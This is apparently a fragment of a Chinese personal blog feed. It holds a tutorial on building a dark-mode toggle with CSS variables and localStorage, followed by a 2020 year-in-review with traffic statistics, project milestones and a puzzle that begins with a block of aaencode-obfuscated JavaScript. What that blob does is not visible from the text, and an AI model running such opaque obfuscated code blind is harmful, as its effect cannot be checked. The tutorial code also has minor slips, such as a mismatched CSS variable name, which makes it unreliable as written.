class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) 